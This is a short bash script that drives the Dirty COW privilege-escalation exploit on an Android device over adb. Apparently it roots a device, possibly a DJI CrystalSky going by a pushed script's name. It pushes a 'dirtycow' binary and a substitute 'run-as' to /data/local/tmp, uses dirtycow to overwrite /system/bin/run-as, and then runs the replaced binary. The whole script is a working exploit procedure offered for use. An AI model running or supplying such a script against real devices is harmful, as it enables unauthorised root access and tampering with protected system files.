#!/bin/bash

adb push dirtycow /data/local/tmp/dirtycow
adb push run-as /data/local/tmp/run-as
adb push SlackOGCrystalSkyLove.sh /data/local/tmp/SlackOGCrystalSkyLove.sh
adb shell 'chmod 755 /data/local/tmp/SlackOGCrystalSkyLove.sh'
echo "Running exploit, may take some time"

adb shell 'chmod 777 /data/local/tmp/run-as'
adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
adb shell /system/bin/run-as
